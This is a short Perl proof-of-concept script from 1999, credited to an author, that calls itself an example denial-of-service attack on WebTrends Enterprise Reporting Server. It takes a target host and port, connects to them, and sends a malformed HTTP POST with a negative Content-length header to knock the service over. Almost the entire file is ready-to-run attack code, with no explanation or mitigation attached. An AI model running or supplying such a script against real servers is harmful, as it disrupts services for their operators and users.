#!/usr/bin/perl -w
# Example DoS against WebTrends Enterprise Reporting Server
# 8/8/99
# rpc <jared@antisocial.com>

use IO::Socket;

die "usage: $0 <host> <port>" unless (@ARGV == 2);

($host, $port) = @ARGV;


$s = IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>'tcp') 
or die "Can't create socket.";

print $s "POST /\r\n";
print $s "Content-type: text/plain\r\n";
print $s "Content-length: -1", "\r\n"x5;

print "done.\n";
